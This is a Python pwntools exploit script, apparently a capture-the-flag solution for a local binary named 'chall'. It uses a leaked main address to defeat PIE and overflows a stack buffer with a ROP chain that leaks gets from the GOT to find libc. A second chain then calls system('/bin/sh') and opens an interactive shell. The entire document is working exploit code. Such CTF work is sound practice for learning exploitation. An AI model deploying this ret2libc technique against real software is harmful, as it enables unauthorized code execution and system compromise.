#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")
libc = ELF("./libc.so.6")

context.binary = exe.path
context.terminal = ["tmux", "new-window"]


def conn():
    if args.REMOTE:
        r = remote("localhost", 1337)
    else:
        r = process([exe.path])

    return r

def attach_gdb():
    if args.GDB:
        gdb.attach(r, gdbscript="""
source ~/opt/pwndbg/gdbinit.py
b*main+119
c
        """)


def main():
    global r
    r = conn()
    attach_gdb()

    r.recvuntil(b"help: ")
    # read the leak and calculate the exe base address
    exe.address = int(r.recvuntil(b"\n", drop=True), 16) - exe.sym["main"]
    info(f"exe @ {hex(exe.address)}")

    pop_rdi = p64(exe.address + 0x0000000000001216) # pop rdi ; ret

    # leak the address of gets in the libc using the Global Offset
    # Table
    # then ret2main
    rop = b"A"*0x28
    rop += pop_rdi
    rop += p64(exe.got["gets"])
    rop += p64(exe.plt["puts"]) # call puts(gets@got)
    rop += p64(exe.sym["main"]) # ret2main

    r.sendlineafter(b"your input:\n", rop)

    # read the leak and calculate the libc base address
    leak = u64(r.recvline()[:-1].ljust(8, b"\x00"))
    libc.address = leak - libc.sym["gets"]
    info(f"libc @ {hex(libc.address)}")

    # find the address of "/bin/sh" in the libc
    bin_sh = p64(next(libc.search(b"/bin/sh\x00")))
    ret = p64(exe.address + 0x000000000000101a) # ret

    rop = b"A"*0x28
    rop += pop_rdi
    rop += bin_sh
    # beware of the movaps issue
    # add a simple ret to align the stack on a multiple of 0x10
    rop += ret
    rop += p64(libc.sym["system"]) # call system("/bin/sh")

    r.sendlineafter(b"your input:\n", rop)

    r.interactive()

if __name__ == "__main__":
    main()
